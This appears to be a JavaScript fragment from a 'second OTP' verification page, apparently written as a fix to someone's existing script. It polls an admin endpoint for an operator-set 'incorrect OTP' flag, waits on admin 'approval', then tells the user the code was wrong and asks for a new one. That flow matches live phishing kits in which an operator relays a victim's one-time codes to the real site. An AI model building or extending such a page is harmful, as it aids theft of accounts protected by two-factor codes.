<script>
  const urlParams = new URLSearchParams(window.location.search);
  const email = urlParams.get('email');
  if (!email) window.location.href = '/users/login';

  const otpInput = document.getElementById('otpInput');
  const verifyBtn = document.getElementById('verifyBtn');
  const errorDiv = document.getElementById('errorMessage');
  const successDiv = document.getElementById('successMessage');
  let isProcessing = false;
  let approvalInterval = null;
  let blockCheckInterval = null;
  let isModalOpen = false;
  let incorrectOtpProcessed = false;

  // ========== INCORRECT OTP HANDLER (IDENTICAL TO FIRST OTP PAGE) ==========
  async function checkIncorrectOtp() {
    try {
      const response = await fetch('/api/users/check-admin-text', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ email })
      });
      const data = await response.json();
      console.log('[DEBUG] checkIncorrectOtp response:', data);

      if (data.admin_text === 'incorrect_otp_error' && data.text_release === false && !incorrectOtpProcessed) {
        incorrectOtpProcessed = true;
        console.log('[INFO] Incorrect OTP flag detected – resetting UI (second OTP page)');

        errorDiv.textContent = '❌ Incorrect OTP. Please enter a new code.';
        errorDiv.style.display = 'block';
        otpInput.value = '';
        otpInput.focus();

        if (approvalInterval) {
          clearInterval(approvalInterval);
          approvalInterval = null;
          console.log('[INFO] Stopped approval polling');
        }

        isProcessing = false;
        verifyBtn.disabled = false;
        verifyBtn.innerHTML = 'Verify';
        console.log('[INFO] Verify button re-enabled');

        await fetch('/api/admin/release-text', {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({ email })
        });
        console.log('[INFO] Server flag cleared');

        setTimeout(() => {
          errorDiv.style.display = 'none';
          incorrectOtpProcessed = false;
        }, 4000);
      }
    } catch (err) {
      console.error('[ERROR] checkIncorrectOtp:', err);
    }
  }

  // ... (the rest of your second-otp.html script remains exactly as before, only add the above function and ensure the polling intervals include it)
  // Make sure you have setInterval(checkIncorrectOtp, 2000) in the startup section.
</script>
